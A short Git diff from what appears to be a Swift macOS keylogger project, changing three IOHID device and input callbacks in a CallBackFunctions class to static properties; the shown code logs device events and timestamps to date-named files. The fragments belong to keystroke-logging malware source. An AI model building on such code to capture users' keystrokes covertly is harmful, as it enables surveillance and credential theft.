@@ -15,7 +15,7 @@ class CallBackFunctions
     static var calander = Calendar.current
     static var prev = ""
     
-    let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
+    static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
         
         let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
         let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
@@ -46,7 +46,7 @@ class CallBackFunctions
         fh?.write(timeStamp.data(using: .utf8)!)
     }
     
-    let Handle_DeviceRemovalCallback: IOHIDDeviceCallback = { context, result, sender, device in
+    static let Handle_DeviceRemovalCallback: IOHIDDeviceCallback = { context, result, sender, device in
         
             
             let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
@@ -78,7 +78,7 @@ class CallBackFunctions
             fh?.write(timeStamp.data(using: .utf8)!)
     }
      
-    let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
+    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
         
         let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
         let elem: IOHIDElement = IOHIDValueGetElement(device );
